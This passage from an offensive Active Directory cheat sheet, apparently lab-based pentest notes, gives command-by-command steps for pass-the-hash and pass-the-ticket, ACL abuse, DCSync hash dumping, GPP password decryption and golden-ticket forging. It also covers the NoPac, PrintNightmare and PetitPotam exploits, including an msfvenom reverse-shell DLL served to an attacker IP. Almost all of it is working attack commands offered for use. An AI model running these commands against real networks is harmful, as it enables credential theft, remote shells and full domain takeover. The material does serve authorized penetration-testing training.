   * Run `xfreerdp /v:targetIP /u:user /pth:hashvalue`
   * If Restricted Admin Mode is disabled, you will read a message telling you "account restrictions are preventing this user from signin in"
   * You can enable restricted admin mode (which is disabled by default) using the following:\
     `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
   * After that, you can try to login again using the first command

***

### **Pass the Ticket (PtT)**

> * Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack.
> * In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash
> * To perform PtT you can either use a TGS or a TGT
> * After performing PtT, the ticket will be stored in the current logon session

**Performing PtT Attacks:**

1. Check the [Kerberoasting Section](broken-reference) to check how to request tickets
2. PtT using Rubeus: `Rubeus.exe asktgt /domain:domain.name /user:username /rc4:hash /ptt`
3. PtT using Rubeus with .kirbi file: `Rubeus.exe ptt /ticket:file.kirbi`
4. PtT using Rubeus - alternative:
   * Convert a .kirbi file to base64:`[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.kirbi"))`
   * Perform PtT using the base64 value you just got: `Rubeus.exe ptt /ticket:base64output`
5. PtT using Mimikatz with .kirbi file: `privilege::debug kerberos::ptt "path-to-file.kirbi"`
6. PtT using Mimikatz - PowerShell Remoting with Pass the Ticket:
   * You can leverage Mimikatz to import a ticket and open a PowerShell console to connect to the target machine
   * First, perform PtT using mimikatz, then
   * Open a PowerShell console: `powershell`
   * Connect to the target machine: `Enter-PSSession -ComputerName DC01`

***

### **Kerberos Double Hop Problem**

* The kerberos "double hop" is an issue that arises whenever attempting to use Kerberos authentication between two or more hops.
* Basically, when an authentication occurs through Kerberos, credentials aren't cached in memory.
* For example, when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login.
* In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.
* Refer to the resources below to find workarounds and more information about this problem.

**Useful Resources:**

1. [https://posts.slayerlabs.com/double-hop/](https://posts.slayerlabs.com/double-hop/)
2. [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-double-hop-problem](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-double-hop-problem)

***

## **ACL Enumeration & Attacks**

> Enumerating ACLs in the AD environment can often turn to estabilish persistence, moving laterally or, in some cases, gaining privilege escalation.

Some interesting ACLs to enumerate and attack are the following:

1. [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword): allows resetting a password without prior knowledge of the current password.
2. [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite): allows writing to any non-protected object attribute.
   * If GenericWrite applies to a `user`, you can assign a fake SPN to such account and perform a targeted Kerberoasting attack.
   * If GenericWrite applies to a `group`, you can add any user account to such group and gain its privileges.
   * If GenericWrite applies to a `computer object`, you can perform a resource-based constrained delegation attack.
3. [AddSelf](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addself): shows the security groups to which the user can join.
4. [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall): gain full control over a target object.
   * If GenericAll applies to a `user` or a `group`, you can modify memberships, force password change or perform a targeted Kerberoasting attack
   * If GenericAll applies to a `computer object` and LAPS is in use, you can read the LAPS password and gain local admin access on the target machine

### **ACL Enumeration**

**Manual ACL Enumeration with PowerView:**

1. Always start by importing the PowerView module in the current PS session: `Import-Module .\PowerView.ps1`
2. Find interesting ACLs: `Find-InterestingDomainAcl`
3. Get target user's sid: `$sid = Convert-NameToSid targetuser`
4. Check target user group membership: `Get-DomainUser -Identity targetuser | select samaccountname,objectsid,memberof,useraccountcontrol | fl`
5. Find all domain object that the user has rights over: `Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
6. Discover an object's ACL based on its GUID: `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
7. Check target user (by SID) to check replication rights (DCSync): `$sid= "SID-VALUE" Get-ObjectAcl "DC=domainname,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl`

**ACL Enumeration with BloodHound:**\
Refer to the previous section

***

### **ACL Abuse Tactics**

> **Prerequisite:** You must have previously found one of the following ACLs by using bloodhound or manual enumeration techniques

#### **Abusing ForcePasswordChange to Change a User's Password**

1. Create a PSCredential Object with the credential of the current user (the one you are currently using to enumerate)
   * `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
   * `$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\validuser', $SecPassword)`
2. Create a new target user password:
   * `$targetUserNewPassword = ConvertTo-SecureString 'blabla' -AsPlainText -Force`
3. Change the target user's password using PowerView:
   * `Import-Module .\PowerView.ps1`
   * `Set-DomainUserPassword -Identity targetUsername -AccountPassword $targetUserNewPassword -Credential $Cred -Verbose`

#### **Abusing GenericAll to Add the Current User to a Group**

1. Create a PSCredential Object with the credential of the current user (the one you are currently using to enumerate)
   * `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
   * `$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\validuser', $SecPassword)`
2. Show the current members of the target group:
   * `Get-ADGroup -Identity "Target Group" -Properties * | Select -ExpandProperty Members`
3. Add the current user to the target group:
   * `Add-DomainGroupMember -Identity 'Target Group' -Members 'targetuser' -Credential $Cred -Verbose`
4. Confirm the user was added:
   * `Get-DomainGroupMember -Identity "Target Group" | Select MemberName`

#### **Abusing GenericWrite to Add Fake SPN and Perform Targeted Kerberoasting**

> If you have control of a Linux domain-joined host, you can use [TargetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform all the following steps in one command

1. Create a PSCredential Object with the credential of a user who shares group membership with the target user
   * `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`
   * `$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\validuser', $SecPassword)`
2. Create a fake SPN:
   * `Set-DomainObject -Credential $Cred -Identity targetuser -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
3. Kerberoast with Rubeus or any alternatives, see the [Kerberoasting Section](broken-reference)
   * `.\Rubeus.exe kerberoast /user:targetuser /nowrap`

***

#### **DCSync (Replicating Directory Changes & Replicating Directory Changes All)**

> DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a DC to retrieve user NTLM password hashes by requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right, which allows the replication of secret data.\
> \
> To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the `Replicating Directory Changes` and `Replicating Directory Changes All` permissions set).\
> Domain/Enterprise Admins and default domain administrators have this right by default.

**Enumerate and Perform a DCSync Attack:**

1. Check target user (by SID) to check replication rights (DCSync):
   * `Import-Module .\PowerView.ps1`
   * `$sid = Convert-NameToSid targetuser` followed by
   * `Get-ObjectAcl "DC=domainname,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl`
2. Extract NTLM hashes from the NDTS.dit file on the DC:
   * Linux: `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/user-with-replication-rights@172.16.5.5 -use-vss`
   * Windows(Mimikatz): `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`

***

## **Miscellaneous Misconfigurations**

**Passwords in User Description Field:**

* Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView.
* `Import-Module .\PowerView.ps1` followed by `Get-DomainUser * | Select-Object samaccountname,description`

**Password not Required or not Subject to Length Policy:**

* It is possible to come across domain accounts with the `passwd_notreqd` field set in the userAccountControl attribute.
* If this is set, _the user is not subject to the current password policy length_, meaning they could have a _shorter password or no password at all_ (if empty passwords are allowed in the domain)
* [PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) - enumerate users with the passwd\_notreqd field:\
  `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`

**New Group Policy Preferences (GPP):**

* When a new GPP is created, an `.xml` file is created in the `SYSVOL` share, which is also cached locally on endpoints that the Group Policy applies to.
* These files can contain an array of configuration data and defined passwords.
* The `cpassword` attribute value is AES-256 bit encrypted, but [Microsoft published the AES private key on MSDN](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password.
* Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
* If you retrieve the cpassword value more manually, run `gpp-decrypt followed by the cpassword hash value` to decrypt the password
* Using CrackMapExec: `crackmapexec smb -L | grep gpp`

***

## **Domain Trusts**

> * A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.
> * A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication.

**Enumerating Trust Relationships:**

1. Enumerate trust relationships:\
   `Import-Module activedirectory` followed by `Get-ADTrust -Filter *`
2. Check existing trusts:\
   `Import-Module .\PowerView.ps1` followed by `Get-DomainTrust` or `Get-DomainTrustMapping`
3. Check users in other Domain:\
   `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName`
4. Query domain trust: `netdom query /domain:inlanefreight.local trust`
5. Query domain controllers: `netdom query /domain:inlanefreight.local dc`
6. Query workstations and servers: `netdom query /domain:inlanefreight.local workstation`
7. Bloodhound: `Map Domain Trusts` pre-built query.

### **ExtraSids Attack (Child to Parent Trust)**

> sidHistory is an attribute used in migration scenarios: when a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain. SID history is intended to work across domains, but can work in the same domain.\
> \
> An attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.\
> \
> If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

**ExtraSids - Creating a Golden Ticket with Mimikatz or Rubeus**

* Suppose you already compromised the child domain and have domain admin access or similar.
* In order to create a golden ticket, you need to find the following:
  * Child domain's KRBTGT account's NT Hash.\
    Mimikatz: `lsadump::dcsync /user:CHILDDOMAIN\krbtgt`
  * Child domain's SID.\
    Use `Get-DomainSID`
  * Child domain's enterprise admin group's SID.\
    Use `Get-DomainGroup -Domain DOMAIN.NAME -Identity "Enterprise Admins" | select distinguishedname,objectsid`
* To create a golden ticket:
  * Mimikatz: `kerberos::golden /user:fakeuser /domain:CHILD.DOMAIN.LOCAL /sid:child-domain-sid /krbtgt:krbtgt-nt-hash /sids:enterprise-admins-group-sid /ptt`
  * Rubeus: `.\Rubeus.exe golden /rc4:krbtgt-nt-hash /domain:CHILD.DOMAIN.LOCAL /sid:child-domain-sid /sids:enterprise-admins-group-sid /user:fakeuser /ptt`
* Use `klist` to check if the Kerberos Ticket is in memory for the previously specified user (which doesn't need to exist).
* You can now list all the contents of the Domain Controller's C drive, perform DCSync and so on

### **Cross-Forest Trust Abuse**

* In a Cross-Forest trust relationship, you can perform cross-forest kerberoasting by just specifying the target domain
* It is also possible to perform cross-forest sid history abuse if SID Filtering is not enabled
* Sometimes, you can find admin password re-use and misconfigured group memberships in a cross-forest trust

***

## **Privilege Escalation to Domain Admin**

### **NoPac**

* NoPac is an intra-domain privilege escalation exploit that allows escalating privileges from any standard user to domain admin level access
* This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller.
* The flow of the attack is outlined here: [SecureWorks Blog](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware)

**Exploiting NoPac:**

1. Get the NoPac exploit: `git clone https://github.com/Ridter/noPac.git`
2. Check if target is vulnerable: `sudo python3 scanner.py domain.name/validuser:validpassword -dc-ip 172.16.5.5 -use-ldap`
3. Get a SYSTEM shell as the built-in administrator: `sudo python3 noPac.py DOMAIN.NAME/validuser:validpassword -dc-ip 172.16.5.5 -dc-host DC-NAME -shell --impersonate administrator -use-ldap`
4. Perform DCSync against the built-in administrator: `sudo python3 noPac.py DOMAIN.NAME/validuser:validpassword -dc-ip 172.16.5.5 -dc-host DC-NAME --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN.NAME/administrator`

***

### **PrintNightmare**

* Vulnerability found in the Print Spooler service that runs on all Windows operating systems that allows for privilege escalation and remote code execution.

**Exploiting PrintNightmare:**

1. Get the exploit: `git clone https://github.com/cube0x0/CVE-2021-1675.git`
2.  Install cube0x0's version of impacket:

    ```
    pip3 uninstall impacket
    git clone https://github.com/cube0x0/impacket
    cd impacket
    python3 ./setup.py install
    ```
3. Check if the Windows target has MS-PAR & MSRPRN exposed:\
   `rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'`
4. Generate a DLL payload to be used by the exploit to gain a shell session:\
   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=local-ip LPORT=anyport -f dll > backupscript.dll`
5. Create an SMB server and host a shared folder (Data) at the location of the DLL payload that the exploit will attempt to download:\
   `sudo smbserver.py -smb2support Data /path/to/backupscript.dll`
6. Run the exploit:\
   `sudo python3 CVE-2021-1675.py domain.name/validusername:validpassword@DC-IP '\\attacker-ip\CompData\backupscript.dll'`

***

### **PetitPotam**

* PetitPotam is an LSA spoofing vulnerability that allows forcing the domain controller to authenticate against another host using NTLM over port 445
* This attack allows an unauthenticated user to take over the domain
* More information about PetitPotam can be found here: [DirkJanm Post](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

**Exploiting PetitPotam:**

1. Start an NTLM relay: `sudo ntlmrelayx.py -debug -smb2support --target http://DOMAIN/URL/to/Certificate/Authoirty/host --adcs --template DomainController` Note: you can use [certi](https://github.com/zer1t0/certi) to find the location of the CA
2. Get Petit Potam: `git clone https://github.com/topotam/PetitPotam.git`
3. Run Petit Potam. \`python3 PetitPotam.py attacker-ip dc-ip
4. If it worked, you will find the base64 encoded certificate for the domain controller on the NTLM relay shell
5. Request a TGT for the domain controller using the certificate: `python3 /PKINITtools/gettgtpkinit.py DOMAIN.NAME/DC-NAME\$ -pfx-base64 <base64 certificate> = dc01.ccache`
6. Set the KRB5CCNAME environment variable to the previous output file: `export KRB5CCNAME=dc01.ccache`
7. Perform DCSync using (`-k`) the previous ccache file : `secretsdump.py -just-dc-user DOMAIN.NAME/administrator -k -no-pass DC-NAME.DOMAIN.NAME`